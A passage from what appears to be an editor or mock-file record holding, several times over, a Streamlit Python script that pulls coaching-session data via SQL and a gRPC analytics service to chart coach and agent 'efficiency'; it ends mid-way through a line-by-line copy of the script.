session_note[1],\\n                    \\"creator_user_id\\": session_note[2],\\n                    \\"submitter_user_name\\": session_note[3],\\n                    \\"submitter_user_id\\": session_note[4],\\n                    \\"session_time\\": session_note[5],\\n                    \\"focus_criteria_template_id\\": '',\\n                    \\"focus_criteria_id\\": '',\\n                    \\"agent_user_name\\": session_note[7],\\n                    \\"agent_user_id\\": session_note[8],\\n                    \\"before_score\\": -1,\\n                    \\"before_convo_count\\": 0,\\n                    \\"after_score\\": -1,\\n                    \\"after_convo_count\\": 0,\\n                })\\n            user_id_name[session_note[2]] = session_note[1]\\n            user_id_name[session_note[4]] = session_note[3]\\n            user_id_name[session_note[8]] = session_note[7]\\n\\n    if len(scorecard_template_id_name_map) == 0:\\n        return coaching_sessions\\n\\n    with conn.cursor() as cursor:\\n        cursor.execute(f\\"\\"\\"\\n            SELECT\\n                resource_id as scorecard_template_id,\\n                title as title,\\n                template as template\\n            FROM director.scorecard_templates \\n            WHERE resource_id IN ('{\\"','\\".join(scorecard_template_id_name_map.keys())}')\\n            \\"\\"\\")\\n        \\n        rows = cursor.fetchall()\\n        for template in rows:\\n            scorecard_template_id_name_map[template[0]] = template[1]\\n            for items in template[2].get('items', []):\\n                if 'identifier' in items and 'displayName' in items:\\n                    template_criteria_id_name_map[items['identifier']] = items['displayName']\\n                if 'items' in items:\\n                    for criteria_items in items['items']:\\n                        if 'identifier' in criteria_items and 'displayName' in criteria_items:\\n                            template_criteria_id_name_map[criteria_items['identifier']] = criteria_items['displayName']\\n\\n        for session in coaching_sessions:\\n            if session['focus_criteria_template_id'] != '':\\n                session['focus_criteria_template'] = scorecard_template_id_name_map[session['focus_criteria_template_id']]\\n            if session['focus_criteria_id'] != '' and session['focus_criteria_id'] in template_criteria_id_name_map:\\n                session['focus_criteria'] = template_criteria_id_name_map[session['focus_criteria_id']]\\n        \\n    return coaching_sessions\\n\\n\\ndef load_scores_data(customer_display_name, coaching_sessions, num_days):\\n    if not coaching_sessions:\\n        return None\\n\\n    customer = next(c for c in all_customers if c['display_name'] == customer_display_name)\\n\\n    progress = st.progress(0, text=\\"Computing the coaching efficiency of the session notes...\\")\\n\\n    port_number, port_forward_process = port_forward_ports_and_processes[customer['prod_env_name']]\\n    if port_forward_process is None or port_forward_process.poll() is not None:\\n        process = subprocess.Popen([\\n            'kubectl',\\n            f'--context={customer[\\"prod_env_name\\"]}',\\n            '--namespace=cresta-api',\\n            'port-forward',\\n            'services/insights-server',\\n            f'{port_number}:80',\\n        ])\\n        port_forward_ports_and_processes[customer['prod_env_name']] = (port_number, process)\\n        time.sleep(2)\\n\\n    api_key = os.environ.get('INSIGHTS_SERVER_API_KEY')\\n    assert api_key, 'INSIGHTS_SERVER_API_KEY must be set'\\n    auth_metadata = [['authorization', f'ApiKey {api_key}']]\\n\\n    with grpc.insecure_channel(\\n            f'localhost:{port_number}',\\n            options=[\\n                ('grpc.max_receive_message_length', 50000000),\\n            ],\\n    ) as channel:\\n        stub = analytics_service_pb2_grpc.AnalyticsServiceStub(channel)\\n        for coaching_session_idx in range(len(coaching_sessions)):\\n            progress.progress(coaching_session_idx / len(coaching_sessions), text=\\"Computing the coaching efficiency of the session notes...\\")\\n            coaching_session = coaching_sessions[coaching_session_idx]\\n            if coaching_session['focus_criteria_id'] != '':\\n                before_score, before_convo_count = query_agent_criteria_score(\\n                    stub, customer, auth_metadata, coaching_session['agent_user_id'], coaching_session['focus_criteria_id'], coaching_session['session_time'] - datetime.timedelta(days=num_days), coaching_session['session_time'])\\n                after_score, after_convo_count = query_agent_criteria_score(\\n                    stub, customer, auth_metadata, coaching_session['agent_user_id'], coaching_session['focus_criteria_id'], coaching_session['session_time'], coaching_session['session_time'] + datetime.timedelta(days=num_days))\\n                coaching_session['before_score'] = before_score\\n                coaching_session['before_convo_count'] = before_convo_count\\n                coaching_session['after_score'] = after_score\\n                coaching_session['after_convo_count'] = after_convo_count\\n\\n    progress.empty()\\n    return coaching_sessions\\n\\n@st.cache_data\\ndef query_agent_criteria_score(_stub, customer, auth_metadata, agent_user_id, criteria_id, start_time, end_time):\\n    parent = f'customers/{customer[\\"customer_id\\"]}/profiles/{customer[\\"profile_id\\"]}'\\n    agent_user_name = f'customers/{customer[\\"customer_id\\"]}/users/{agent_user_id}'\\n    try:\\n        request = analytics_service_pb2.RetrieveQAScoreStatsRequest(\\n            parent=parent,\\n            read_from_clickhouse=True,\\n            filter_by_time_range=common_pb2.TimeRange(\\n                start_timestamp=timestamp_pb2.Timestamp(seconds=int(start_time.timestamp()), ),\\n                end_timestamp=timestamp_pb2.Timestamp(seconds=int(end_time.timestamp()), ),\\n            ),\\n            filter_by_attribute=qa_stats_pb2.QAAttribute(\\n                    users=[user_pb2.User(name=agent_user_name)],\\n                    criterion_identifiers=[criteria_id],\\n                ),\\n            group_by_attribute_types=[\\n                qa_stats_pb2.QAAttributeType.QA_ATTRIBUTE_TYPE_CRITERION,\\n            ],\\n        )\\n        response = _stub.RetrieveQAScoreStats(\\n            request,\\n            metadata=auth_metadata,\\n            timeout=600)\\n    except Exception as e:\\n        print(f'Error querying Insights Server: {e}')\\n        return None\\n    if response.qa_score_result.total_conversation_count == 0:\\n        return -1, 0\\n    return response.qa_score_result.average_qa_score, response.qa_score_result.total_conversation_count\\n\\n\\n##############################################################################################\\n\\ncustomer_display_name = st.selectbox(\\n    'Select a customer:',\\n    [c['display_name'] for c in all_customers])\\n\\nnum_last_days = st.number_input(\\"How many days back to load the session notes?\\", min_value=7, max_value=180, value=30, step=1)\\n\\nnum_days = st.number_input(\\"How many days to measure the session efficiency?\\", min_value=1, max_value=30, value=7, step=1)\\n\\ncoaching_sessions = load_coaching_data(customer_display_name, num_last_days, num_days)\\n\\ncoaching_sessions = load_scores_data(customer_display_name, coaching_sessions, num_days)\\n\\nwith st.expander(\\"All loaded session notes\\", expanded=True):\\n    st.write(f\\"Loaded {len(coaching_sessions)} coaching sessions in total\\")\\n    session_df = pd.DataFrame(coaching_sessions)\\n    st.dataframe(session_df)\\n    st.write(f\\"Loaded {len(session_df['session_id'].unique())} coaching sessions in { len(session_df['coaching_plan_id'].unique()) } coaching plans.\\")\\n    # session_df.to_csv('coaching_sessions.csv', index=False)  # Set index=False to omit row numbers\\n\\nwith st.expander(\\"Session notes with valid scores\\", expanded=True):\\n    # Coach efficiency chart.\\n    valid_session_df = session_df[(session_df['before_score'] >= 0) & (session_df['after_score'] >= 0)].reset_index()\\n    st.dataframe(valid_session_df)\\n \\n    session_with_criteria_df = session_df[session_df['focus_criteria_id'] != '']\\n    st.write(f\\"Loaded {len(session_with_criteria_df['session_id'].unique())} coaching sessions with focus criteria in the coaching plan.\\")\\n    st.write(f\\"Loaded {len(valid_session_df['session_id'].unique())} coaching sessions with valid performance scores computed.\\")\\n\\ndef weighted_effiency(df):\\n    efficiency = ((df['after_score'] - df['before_score']) * df['after_convo_count']).sum() / df['after_convo_count'].sum()\\n    num_sessions =  len(df['session_id'].unique())\\n    return pd.Series({\\n        'efficiency': efficiency,\\n        'num_sessions': num_sessions\\n    })\\n\\nwith st.expander(\\"Session efficiency\\", expanded=True):\\n    session_efficiency_df = valid_session_df.groupby('session_id').apply(weighted_effiency).reset_index()\\n    session_efficiency_df.columns = ['Session id', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(session_efficiency_df)\\n    fig = px.histogram(session_efficiency_df, x=\\"Efficiency\\", nbins=100)\\n    st.plotly_chart(fig, theme=\\"streamlit\\")\\n\\nwith st.expander(\\"Coaching plan efficiency\\", expanded=True):\\n    plan_efficiency_df = valid_session_df.groupby('coaching_plan_id').apply(weighted_effiency).reset_index()\\n    plan_efficiency_df.columns = ['Coach Plan', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(plan_efficiency_df)\\n    fig = px.histogram(plan_efficiency_df, x=\\"Efficiency\\", nbins=100)\\n    st.plotly_chart(fig, theme=\\"streamlit\\")\\n\\nwith st.expander(\\"Focus criteria efficiency\\", expanded=True):\\n    criteria_efficiency_df = valid_session_df.groupby('focus_criteria').apply(weighted_effiency).reset_index()\\n    criteria_efficiency_df.columns = ['Focus Criteria', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(criteria_efficiency_df)\\n    fig = px.histogram(criteria_efficiency_df, x=\\"Efficiency\\", nbins=100)\\n    st.plotly_chart(fig, theme=\\"streamlit\\")\\n\\nwith st.expander(\\"Focus scorecard template efficiency\\", expanded=True):\\n    template_efficiency_df = valid_session_df.groupby('focus_criteria_template').apply(weighted_effiency).reset_index()\\n    template_efficiency_df.columns = ['Focus Scorecard Template', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(template_efficiency_df)\\n    fig = px.histogram(template_efficiency_df, x=\\"Efficiency\\", nbins=100)\\n    st.plotly_chart(fig, theme=\\"streamlit\\")\\n\\nwith st.expander(\\"Coach efficiency\\", expanded=True):\\n    coach_efficiency_df = valid_session_df.groupby('creator_user_name').apply(weighted_effiency).reset_index()\\n    coach_efficiency_df.columns = ['Coach', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(coach_efficiency_df)\\n    st.scatter_chart(data=coach_efficiency_df, x='Number of Sessions', y='Efficiency', size='Number of Sessions')\\n\\nwith st.expander(\\"Agent efficiency\\", expanded=True):\\n    # Agent efficiency chart.\\n    agent_efficiency_df = valid_session_df.groupby('agent_user_name').apply(weighted_effiency).reset_index()\\n    agent_efficiency_df.columns = ['Agent', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(agent_efficiency_df)\\n    st.scatter_chart(data=agent_efficiency_df, x='Number of Sessions', y='Efficiency', size='Number of Sessions')\\n","originalContents":"export const mockFile = \`downloadFileimport argparse\\nimport collections\\nimport datetime\\nimport grpc\\nimport itertools\\nimport numpy as np\\nimport os\\nimport pandas as pd\\nimport pandas.io.sql as sqlio\\nimport subprocess\\nimport time\\nimport streamlit as st\\nfrom collections import defaultdict\\nimport plotly.express as px\\n\\nfrom google.protobuf import timestamp_pb2\\n\\nfrom cresta.v1.analytics import analytics_service_pb2\\nfrom cresta.v1.analytics import analytics_service_pb2_grpc\\nfrom cresta.v1.analytics import common_pb2\\nfrom cresta.v1.analytics import qa_stats_pb2\\nfrom cresta.v1.user import user_pb2\\n\\nfrom greyparrot.common import Customer\\nfrom greyparrot.conversations.db import ConversationsDBConn\\n\\nst.write(\\"\\"\\"# Coaching Report #\\"\\"\\")\\n\\nport_forward_ports_and_processes = {\\n    'chat-prod': (8081, None),\\n    'voice-prod': (8082, None),\\n    'us-west-2-prod': (8083, None),\\n}\\n\\nall_customers = [{\\n    'display_name': f'{display_name} ({customer_name})',\\n    'name': customer_name,\\n    'customer_id': customer_id,\\n    'profile_id': profile_id,\\n    'prod_env_name': prod_env_name,\\n    'domain': domain,\\n} for display_name, customer_name, customer_id, profile_id, prod_env_name, domain in sorted(\\n    list(\\n        set((c.pretty_name or c.name.value, c.name.value, c.customer_id, c.profile_id,\\n             c.prod_env_name, c.domain) for c in Customer.all()\\n            if c.prod_env_name in port_forward_ports_and_processes.keys())))]\\n\\ndef build_coaching_plan_url(customer, agent_user_id, coaching_plan_id):\\n    return f\\"{customer['domain']}/director/coaching/workflow/agent/{agent_user_id}/plan/{coaching_plan_id}\\"\\n\\n@st.cache_data\\ndef load_coaching_data(customer_display_name, num_last_days, num_days):\\n    if not customer_display_name:\\n        return None\\n\\n    current_datetime = datetime.datetime.now(datetime.timezone.utc)\\n    first_session_days = current_datetime - datetime.timedelta(days=num_last_days)\\n    last_session_days = current_datetime - datetime.timedelta(days=num_days)\\n\\n    customer = next(c for c in all_customers if c['display_name'] == customer_display_name)\\n\\n    db_conn = ConversationsDBConn.from_customer_name(customer['name'])\\n    conn = db_conn.session.connection().connection\\n\\n    user_id_name = {}\\n    scorecard_template_id_name_map = {}\\n    template_criteria_id_name_map = {}\\n    coaching_sessions = []\\n\\n    with conn.cursor() as cursor:\\n        cursor.execute(f\\"\\"\\"\\n            SELECT\\n                coaching_plans.resource_id as coaching_plan_id,\\n                cu.full_name as creator_user_name,\\n                cu.user_id as creator_user_id,\\n                COALESCE(su.full_name, '') as submitter_user_name,\\n                COALESCE(su.user_id, '') as submitter_user_id,\\n                coaching_sessions.session_at as session_time,\\n                coaching_plans.focus_criteria_ids as focus_behaviors,\\n                au.full_name as agent_user_name,\\n                au.user_id as agent_user_id,\\n                coaching_sessions.resource_id as session_id,\\n                coaching_sessions.usecase_id as usecase\\n            FROM director.coaching_plans \\n                JOIN director.coaching_sessions ON coaching_plans.resource_id = coaching_sessions.coaching_plan_id\\n                JOIN app.users as cu ON coaching_sessions.creator_user_id = cu.user_id\\n                LEFT JOIN app.users as su ON coaching_sessions.manager_submitter_user_id = su.user_id\\n                JOIN app.users as au ON coaching_plans.agent_user_id = au.user_id\\n            WHERE coaching_sessions.manager_submitted_at > '{first_session_days.strftime(\\"%Y-%m-%d\\")}'\\n                AND coaching_sessions.session_at <= '{last_session_days.strftime(\\"%Y-%m-%d\\")}'\\n            \\"\\"\\")\\n        \\n        rows = cursor.fetchall()\\n        for session_note in rows:\\n            if session_note[6] is not None and len(session_note[6]) > 0:\\n                focus_criteria = session_note[6]\\n                for criteria in focus_criteria:\\n                    ids = criteria.split('/')\\n                    scorecard_template_id_name_map[ids[0]] = ''\\n                    coaching_sessions.append({\\n                        \\"session_id\\": session_note[9],\\n                        \\"usecase\\": session_note[10],\\n                        \\"coaching_plan_id\\": session_note[0],\\n                        \\"coaching_plan_url\\": build_coaching_plan_url(customer, session_note[8], session_note[0]),\\n                        \\"creator_user_name\\": session_note[1],\\n                        \\"creator_user_id\\": session_note[2],\\n                        \\"submitter_user_name\\": session_note[3],\\n                        \\"submitter_user_id\\": session_note[4],\\n                        \\"session_time\\": session_note[5],\\n                        \\"focus_criteria_template_id\\": ids[0],\\n                        \\"focus_criteria_id\\": ids[1],\\n                        \\"agent_user_name\\": session_note[7],\\n                        \\"agent_user_id\\": session_note[8],\\n                        \\"before_score\\": -1,\\n                        \\"before_convo_count\\": 0,\\n                        \\"after_score\\": -1,\\n                        \\"after_convo_count\\": 0,\\n                    })\\n            else:\\n                coaching_sessions.append({\\n                    \\"session_id\\": session_note[9],\\n                    \\"coaching_plan_id\\": session_note[0],\\n                    \\"coaching_plan_url\\": build_coaching_plan_url(customer, session_note[8], session_note[0]),\\n                    \\"creator_user_name\\": session_note[1],\\n                    \\"creator_user_id\\": session_note[2],\\n                    \\"submitter_user_name\\": session_note[3],\\n                    \\"submitter_user_id\\": session_note[4],\\n                    \\"session_time\\": session_note[5],\\n                    \\"focus_criteria_template_id\\": '',\\n                    \\"focus_criteria_id\\": '',\\n                    \\"agent_user_name\\": session_note[7],\\n                    \\"agent_user_id\\": session_note[8],\\n                    \\"before_score\\": -1,\\n                    \\"before_convo_count\\": 0,\\n                    \\"after_score\\": -1,\\n                    \\"after_convo_count\\": 0,\\n                })\\n            user_id_name[session_note[2]] = session_note[1]\\n            user_id_name[session_note[4]] = session_note[3]\\n            user_id_name[session_note[8]] = session_note[7]\\n\\n    if len(scorecard_template_id_name_map) == 0:\\n        return coaching_sessions\\n\\n    with conn.cursor() as cursor:\\n        cursor.execute(f\\"\\"\\"\\n            SELECT\\n                resource_id as scorecard_template_id,\\n                title as title,\\n                template as template\\n            FROM director.scorecard_templates \\n            WHERE resource_id IN ('{\\"','\\".join(scorecard_template_id_name_map.keys())}')\\n            \\"\\"\\")\\n        \\n        rows = cursor.fetchall()\\n        for template in rows:\\n            scorecard_template_id_name_map[template[0]] = template[1]\\n            for items in template[2].get('items', []):\\n                if 'identifier' in items and 'displayName' in items:\\n                    template_criteria_id_name_map[items['identifier']] = items['displayName']\\n                if 'items' in items:\\n                    for criteria_items in items['items']:\\n                        if 'identifier' in criteria_items and 'displayName' in criteria_items:\\n                            template_criteria_id_name_map[criteria_items['identifier']] = criteria_items['displayName']\\n\\n        for session in coaching_sessions:\\n            if session['focus_criteria_template_id'] != '':\\n                session['focus_criteria_template'] = scorecard_template_id_name_map[session['focus_criteria_template_id']]\\n            if session['focus_criteria_id'] != '' and session['focus_criteria_id'] in template_criteria_id_name_map:\\n                session['focus_criteria'] = template_criteria_id_name_map[session['focus_criteria_id']]\\n        \\n    return coaching_sessions\\n\\n\\ndef load_scores_data(customer_display_name, coaching_sessions, num_days):\\n    if not coaching_sessions:\\n        return None\\n\\n    customer = next(c for c in all_customers if c['display_name'] == customer_display_name)\\n\\n    progress = st.progress(0, text=\\"Computing the coaching efficiency of the session notes...\\")\\n\\n    port_number, port_forward_process = port_forward_ports_and_processes[customer['prod_env_name']]\\n    if port_forward_process is None or port_forward_process.poll() is not None:\\n        process = subprocess.Popen([\\n            'kubectl',\\n            f'--context={customer[\\"prod_env_name\\"]}',\\n            '--namespace=cresta-api',\\n            'port-forward',\\n            'services/insights-server',\\n            f'{port_number}:80',\\n        ])\\n        port_forward_ports_and_processes[customer['prod_env_name']] = (port_number, process)\\n        time.sleep(2)\\n\\n    api_key = os.environ.get('INSIGHTS_SERVER_API_KEY')\\n    assert api_key, 'INSIGHTS_SERVER_API_KEY must be set'\\n    auth_metadata = [['authorization', f'ApiKey {api_key}']]\\n\\n    with grpc.insecure_channel(\\n            f'localhost:{port_number}',\\n            options=[\\n                ('grpc.max_receive_message_length', 50000000),\\n            ],\\n    ) as channel:\\n        stub = analytics_service_pb2_grpc.AnalyticsServiceStub(channel)\\n        for coaching_session_idx in range(len(coaching_sessions)):\\n            progress.progress(coaching_session_idx / len(coaching_sessions), text=\\"Computing the coaching efficiency of the session notes...\\")\\n            coaching_session = coaching_sessions[coaching_session_idx]\\n            if coaching_session['focus_criteria_id'] != '':\\n                before_score, before_convo_count = query_agent_criteria_score(\\n                    stub, customer, auth_metadata, coaching_session['agent_user_id'], coaching_session['focus_criteria_id'], coaching_session['session_time'] - datetime.timedelta(days=num_days), coaching_session['session_time'])\\n                after_score, after_convo_count = query_agent_criteria_score(\\n                    stub, customer, auth_metadata, coaching_session['agent_user_id'], coaching_session['focus_criteria_id'], coaching_session['session_time'], coaching_session['session_time'] + datetime.timedelta(days=num_days))\\n                coaching_session['before_score'] = before_score\\n                coaching_session['before_convo_count'] = before_convo_count\\n                coaching_session['after_score'] = after_score\\n                coaching_session['after_convo_count'] = after_convo_count\\n\\n    progress.empty()\\n    return coaching_sessions\\n\\n@st.cache_data\\ndef query_agent_criteria_score(_stub, customer, auth_metadata, agent_user_id, criteria_id, start_time, end_time):\\n    parent = f'customers/{customer[\\"customer_id\\"]}/profiles/{customer[\\"profile_id\\"]}'\\n    agent_user_name = f'customers/{customer[\\"customer_id\\"]}/users/{agent_user_id}'\\n    try:\\n        request = analytics_service_pb2.RetrieveQAScoreStatsRequest(\\n            parent=parent,\\n            read_from_clickhouse=True,\\n            filter_by_time_range=common_pb2.TimeRange(\\n                start_timestamp=timestamp_pb2.Timestamp(seconds=int(start_time.timestamp()), ),\\n                end_timestamp=timestamp_pb2.Timestamp(seconds=int(end_time.timestamp()), ),\\n            ),\\n            filter_by_attribute=qa_stats_pb2.QAAttribute(\\n                    users=[user_pb2.User(name=agent_user_name)],\\n                    criterion_identifiers=[criteria_id],\\n                ),\\n            group_by_attribute_types=[\\n                qa_stats_pb2.QAAttributeType.QA_ATTRIBUTE_TYPE_CRITERION,\\n            ],\\n        )\\n        response = _stub.RetrieveQAScoreStats(\\n            request,\\n            metadata=auth_metadata,\\n            timeout=600)\\n    except Exception as e:\\n        print(f'Error querying Insights Server: {e}')\\n        return None\\n    if response.qa_score_result.total_conversation_count == 0:\\n        return -1, 0\\n    return response.qa_score_result.average_qa_score, response.qa_score_result.total_conversation_count\\n\\n\\n##############################################################################################\\n\\ncustomer_display_name = st.selectbox(\\n    'Select a customer:',\\n    [c['display_name'] for c in all_customers])\\n\\nnum_last_days = st.number_input(\\"How many days back to load the session notes?\\", min_value=7, max_value=180, value=30, step=1)\\n\\nnum_days = st.number_input(\\"How many days to measure the session efficiency?\\", min_value=1, max_value=30, value=7, step=1)\\n\\ncoaching_sessions = load_coaching_data(customer_display_name, num_last_days, num_days)\\n\\ncoaching_sessions = load_scores_data(customer_display_name, coaching_sessions, num_days)\\n\\nwith st.expander(\\"All loaded session notes\\", expanded=True):\\n    st.write(f\\"Loaded {len(coaching_sessions)} coaching sessions in total\\")\\n    session_df = pd.DataFrame(coaching_sessions)\\n    st.dataframe(session_df)\\n    st.write(f\\"Loaded {len(session_df['session_id'].unique())} coaching sessions in { len(session_df['coaching_plan_id'].unique()) } coaching plans.\\")\\n    # session_df.to_csv('coaching_sessions.csv', index=False)  # Set index=False to omit row numbers\\n\\nwith st.expander(\\"Session notes with valid scores\\", expanded=True):\\n    # Coach efficiency chart.\\n    valid_session_df = session_df[(session_df['before_score'] >= 0) & (session_df['after_score'] >= 0)].reset_index()\\n    st.dataframe(valid_session_df)\\n \\n    session_with_criteria_df = session_df[session_df['focus_criteria_id'] != '']\\n    st.write(f\\"Loaded {len(session_with_criteria_df['session_id'].unique())} coaching sessions with focus criteria in the coaching plan.\\")\\n    st.write(f\\"Loaded {len(valid_session_df['session_id'].unique())} coaching sessions with valid performance scores computed.\\")\\n\\ndef weighted_effiency(df):\\n    efficiency = ((df['after_score'] - df['before_score']) * df['after_convo_count']).sum() / df['after_convo_count'].sum()\\n    num_sessions =  len(df['session_id'].unique())\\n    return pd.Series({\\n        'efficiency': efficiency,\\n        'num_sessions': num_sessions\\n    })\\n\\nwith st.expander(\\"Session efficiency\\", expanded=True):\\n    session_efficiency_df = valid_session_df.groupby('session_id').apply(weighted_effiency).reset_index()\\n    session_efficiency_df.columns = ['Session id', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(session_efficiency_df)\\n    fig = px.histogram(session_efficiency_df, x=\\"Efficiency\\", nbins=100)\\n    st.plotly_chart(fig, theme=\\"streamlit\\")\\n\\nwith st.expander(\\"Coaching plan efficiency\\", expanded=True):\\n    plan_efficiency_df = valid_session_df.groupby('coaching_plan_id').apply(weighted_effiency).reset_index()\\n    plan_efficiency_df.columns = ['Coach Plan', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(plan_efficiency_df)\\n    fig = px.histogram(plan_efficiency_df, x=\\"Efficiency\\", nbins=100)\\n    st.plotly_chart(fig, theme=\\"streamlit\\")\\n\\nwith st.expander(\\"Focus criteria efficiency\\", expanded=True):\\n    criteria_efficiency_df = valid_session_df.groupby('focus_criteria').apply(weighted_effiency).reset_index()\\n    criteria_efficiency_df.columns = ['Focus Criteria', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(criteria_efficiency_df)\\n    fig = px.histogram(criteria_efficiency_df, x=\\"Efficiency\\", nbins=100)\\n    st.plotly_chart(fig, theme=\\"streamlit\\")\\n\\nwith st.expander(\\"Focus scorecard template efficiency\\", expanded=True):\\n    template_efficiency_df = valid_session_df.groupby('focus_criteria_template').apply(weighted_effiency).reset_index()\\n    template_efficiency_df.columns = ['Focus Scorecard Template', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(template_efficiency_df)\\n    fig = px.histogram(template_efficiency_df, x=\\"Efficiency\\", nbins=100)\\n    st.plotly_chart(fig, theme=\\"streamlit\\")\\n\\nwith st.expander(\\"Coach efficiency\\", expanded=True):\\n    coach_efficiency_df = valid_session_df.groupby('creator_user_name').apply(weighted_effiency).reset_index()\\n    coach_efficiency_df.columns = ['Coach', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(coach_efficiency_df)\\n    st.scatter_chart(data=coach_efficiency_df, x='Number of Sessions', y='Efficiency', size='Number of Sessions')\\n\\nwith st.expander(\\"Agent efficiency\\", expanded=True):\\n    # Agent efficiency chart.\\n    agent_efficiency_df = valid_session_df.groupby('agent_user_name').apply(weighted_effiency).reset_index()\\n    agent_efficiency_df.columns = ['Agent', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(agent_efficiency_df)\\n    st.scatter_chart(data=agent_efficiency_df, x='Number of Sessions', y='Efficiency', size='Number of Sessions')\\n","detailedLines":[{"text":"export const mockFile = \`downloadFileimport argparse","lineNumber":1},{"text":"import collections","lineNumber":2},{"text":"import datetime","lineNumber":3},{"text":"import grpc","lineNumber":4},{"text":"import itertools","lineNumber":5},{"text":"import numpy as np","lineNumber":6},{"text":"import os","lineNumber":7},{"text":"import pandas as pd","lineNumber":8},{"text":"import pandas.io.sql as sqlio","lineNumber":9},{"text":"import subprocess","lineNumber":10},{"text":"import time","lineNumber":11},{"text":"import streamlit as st","lineNumber":12},{"text":"from collections import defaultdict","lineNumber":13},{"text":"import plotly.express as px","lineNumber":14},{"lineNumber":15},{"text":"from google.protobuf import timestamp_pb2","lineNumber":16},{"lineNumber":17},{"text":"from cresta.v1.analytics import analytics_service_pb2","lineNumber":18},{"text":"from cresta.v1.analytics import analytics_service_pb2_grpc","lineNumber":19},{"text":"from cresta.v1.analytics import common_pb2","lineNumber":20},{"text":"from cresta.v1.analytics import qa_stats_pb2","lineNumber":21},{"text":"from cresta.v1.user import user_pb2","lineNumber":22},{"lineNumber":23},{"text":"from greyparrot.common import Customer","lineNumber":24},{"text":"from greyparrot.conversations.db import ConversationsDBConn","lineNumber":25},{"lineNumber":26},{"text":"st.write(\\"\\"\\"# Coaching Report #\\"\\"\\")","lineNumber":27},{"lineNumber":28},{"text":"port_forward_ports_and_processes = {","lineNumber":29},{"text":"    'chat-prod': (8081, None),","lineNumber":30},{"text":"    'voice-prod': (8082, None),","lineNumber":31},{"text":"    'us-west-2-prod': (8083, None),","lineNumber":32},{"text":"}","lineNumber":33},{"lineNumber":34},{"text":"all_customers = [{","lineNumber":35},{"text":"    'display_name': f'{display_name} ({customer_name})',","lineNumber":36},{"text":"    'name': customer_name,","lineNumber":37},{"text":"    'customer_id': customer_id,","lineNumber":38},{"text":"    'profile_id': profile_id,","lineNumber":39},{"text":"    'prod_env_name': prod_env_name,","lineNumber":40},{"text":"    'domain': domain,","lineNumber":41},{"text":"} for display_name, customer_name, customer_id, profile_id, prod_env_name, domain in sorted(","lineNumber":42},{"text":"    list(","lineNumber":43},{"text":"        set((c.pretty_name or c.name.value, c.name.value, c.customer_id, c.profile_id,","lineNumber":44},{"text":"             c.prod_env_name, c.domain) for c in Customer.all()","lineNumber":45},{"text":"            if c.prod_env_name in port_forward_ports_and_processes.keys())))]","lineNumber":46},{"lineNumber":47},{"text":"def build_coaching_plan_url(customer, agent_user_id, coaching_plan_id):","lineNumber":48},{"text":"    return f\\"{customer['domain']}/director/coaching/workflow/agent/{agent_user_id}/plan/{coaching_plan_id}\\"","lineNumber":49},{"lineNumber":50},{"text":"@st.cache_data","lineNumber":51},{"text":"def load_coaching_data(customer_display_name, num_last_days, num_days):","lineNumber":52},{"text":"    if not customer_display_name:","lineNumber":53},{"text":"        return None","lineNumber":54},{"lineNumber":55},{"text":"    current_datetime = datetime.datetime.now(datetime.timezone.utc)","lineNumber":56},{"text":"    first_session_days = current_datetime - datetime.timedelta(days=num_last_days)","lineNumber":57},{"text":"    last_session_days = current_datetime - datetime.timedelta(days=num_days)","lineNumber":58},{"lineNumber":59},{"text":"    customer = next(c for c in all_customers if c['display_name'] == customer_display_name)","lineNumber":60},{"lineNumber":61},{"text":"    db_conn = ConversationsDBConn.from_customer_name(customer['name'])","lineNumber":62},{"text":"    conn = db_conn.session.connection().connection","lineNumber":63},{"lineNumber":64},{"text":"    user_id_name = {}","lineNumber":65},{"text":"    scorecard_template_id_name_map = {}","lineNumber":66},{"text":"    template_criteria_id_name_map = {}","lineNumber":67},{"text":"    coaching_sessions = []","lineNumber":68},{"lineNumber":69},{"text":"    with conn.cursor() as cursor:","lineNumber":70},{"text":"        cursor.execute(f\\"\\"\\"","lineNumber":71},{"text":"            SELECT","lineNumber":72},{"text":"                coaching_plans.resource_id as coaching_plan_id,","lineNumber":73},{"text":"                cu.full_name as creator_user_name,","lineNumber":74},{"text":"                cu.user_id as creator_user_id,","lineNumber":75},{"text":"                COALESCE(su.full_name, '') as submitter_user_name,","lineNumber":76},{"text":"                COALESCE(su.user_id, '') as submitter_user_id,","lineNumber":77},{"text":"                coaching_sessions.session_at as session_time,","lineNumber":78},{"text":"                coaching_plans.focus_criteria_ids as focus_behaviors,","lineNumber":79},{"text":"                au.full_name as agent_user_name,","lineNumber":80},{"text":"                au.user_id as agent_user_id,","lineNumber":81},{"text":"                coaching_sessions.resource_id as session_id,","lineNumber":82},{"text":"                coaching_sessions.usecase_id as usecase","lineNumber":83},{"text":"            FROM director.coaching_plans ","lineNumber":84},{"text":"                JOIN director.coaching_sessions ON coaching_plans.resource_id = coaching_sessions.coaching_plan_id","lineNumber":85},{"text":"                JOIN app.users as cu ON coaching_sessions.creator_user_id = cu.user_id","lineNumber":86},{"text":"                LEFT JOIN app.users as su ON coaching_sessions.manager_submitter_user_id = su.user_id","lineNumber":87},{"text":"                JOIN app.users as au ON coaching_plans.agent_user_id = au.user_id","lineNumber":88},{"text":"            WHERE coaching_sessions.manager_submitted_at > '{first_session_days.strftime(\\"%Y-%m-%d\\")}'","lineNumber":89},{"text":"                AND coaching_sessions.session_at <= '{last_session_days.strftime(\\"%Y-%m-%d\\")}'","lineNumber":90},{"text":"            \\"\\"\\")","lineNumber":91},{"text":"        ","lineNumber":92},{"text":"        rows = cursor.fetchall()","lineNumber":93},{"text":"        for session_note in rows:","lineNumber":94},{"text":"            if session_note[6] is not None and len(session_note[6]) > 0:","lineNumber":95},{"text":"                focus_criteria = session_note[6]","lineNumber":96},{"text":"                for criteria in focus_criteria:","lineNumber":97},{"text":"                    ids = criteria.split('/')","lineNumber":98},{"text":"                    scorecard_template_id_name_map[ids[0]] = ''","lineNumber":99},{"text":"                    coaching_sessions.append({","lineNumber":100},{"text":"                        \\"session_id\\": session_note[9],","lineNumber":101},{"text":"                        \\"usecase\\": 